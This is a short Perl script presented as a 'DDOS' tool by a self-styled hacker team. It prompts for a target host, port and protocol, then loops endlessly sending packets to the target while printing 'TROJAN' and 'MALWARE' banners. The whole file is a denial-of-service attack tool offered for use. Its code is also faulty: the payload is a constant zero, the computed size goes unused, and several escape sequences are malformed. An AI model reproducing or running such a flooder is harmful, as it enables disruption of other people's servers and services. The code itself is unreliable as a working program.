#bitte kein weiterverkauf an andere, danke lg ja0
use IO::Socket;

system ('cls');
system ('title DDOS');
print "\a
-------------------------
\033[91m[+]DDOS by ShadowBrother°[+]

[×] DARK SIDE HACKER TEAM [×]

Created : Mr.S60
Version : 0 \ 1 \ 0
-------------------------
\n";

print "\033[92m \n PERGUNAKAN DENGAN BAIK DAN BIJAK)\n\n";

system ('PAUSE');
system ('cls');

print "\033[92\nHHost:\a";
chomp ($host = <STDIN>);

system ('cls');

print "\033[92 \nPPort:\a";
chomp ($port = <STDIN>);

system ('cls');

print "\033[92 \nPProtokol (TCP oder. UDP):\a";
chomp ($proto = <STDIN>);

{

$sock = IO::Socket::INET->new(Proto=>"$proto", PeerAddr=>"$host", PeerPort=>"$port") || die "\nCould not connect to the remote machine. Either the machine is offline or the port is not in use on the selected protocol.\a";

}

Packets:
while (1) {
$size = rand() * 8921873 * 9991988;
print ("TROJAN: $host:$port~$proto MALWARE Sent: $size\n");
send($sock, 0, $size)

}
